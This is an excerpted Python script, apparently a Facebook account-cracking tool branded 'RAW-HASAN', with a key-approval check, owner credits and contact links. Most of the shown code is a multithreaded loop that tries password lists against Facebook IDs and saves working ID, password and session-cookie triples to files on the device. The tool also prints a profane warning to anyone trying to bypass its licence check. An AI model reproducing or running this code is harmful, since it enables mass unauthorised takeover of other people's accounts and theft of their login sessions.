...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mRAW-HASAN\33[1;91m⊁ ')
...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY RAW');exit()
        else:exit()
    except:exit()   

try:
	prox= requests.get('https://github.com/mrx-com/mrx/blob/main/mrx.txt').text
...
\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
 [<>] \033[1;36mOWNER   :  ANIS LOUHICHI
 [<>] \033[1;32mBROTHER :  ANIS LOUHICHI 
 [<>] \033[1;34mGITHUB  :  PIKSO404
...
class apvroval:
    def check():
        url = "https://github.com/mrx-com/mrx/blob/main/mrx.txt"
        import mechanize
        ...
        try:
            ...
            if MY_KEY in check_key:
                ...
                os.system('xdg-open https://wa.me/+21369491481 ')
...
class Main:
    def Awm():
        ...
        elif awm in ['3']:os.system('xdg-open https://www.facebook.com/profile.php?id=61555872831623')
...
def Awm_File():
    ...
    with tred(max_workers=30) as My_Tanisha:
        ...
        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/RAW-OK.txt{W}")
        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/RAW-CP.txt{W}")
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[RAW>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[RAW-OK] {ids} | {pas}')
                open('/sdcard/RAW-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/RAW-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[RAW>RNDM] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[RAW-OK] {uid} | {pas}')
                open('/sdcard/RAW-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
